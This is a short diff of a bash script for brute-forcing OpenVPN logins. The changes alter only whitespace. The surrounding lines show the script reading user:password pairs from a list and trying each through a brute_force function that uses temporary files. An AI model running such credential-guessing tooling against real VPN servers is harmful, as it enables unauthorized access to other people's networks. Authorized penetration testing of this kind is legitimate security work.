@@ -9,8 +9,8 @@ function brute_force()
 	output_file="`mktemp /tmp/brute_force_openvpn_$USER.XXXXXX`"
 
 	rm -f $brute_file $output_file
-
-	user_name="$1"
+	
+        user_name="$1"
 	password="$2"
 
 	echo "$user_name" > "$brute_file"
@@ -73,7 +73,7 @@ function main()
 	do
 		user_name="`echo "$line" | cut -d ":" -f1`"
 		password="`echo "$line" | cut -d ":" -f2`"
-
+    
 		result="`brute_force "$user_name" "$password"`"
 		echo "$result"
 
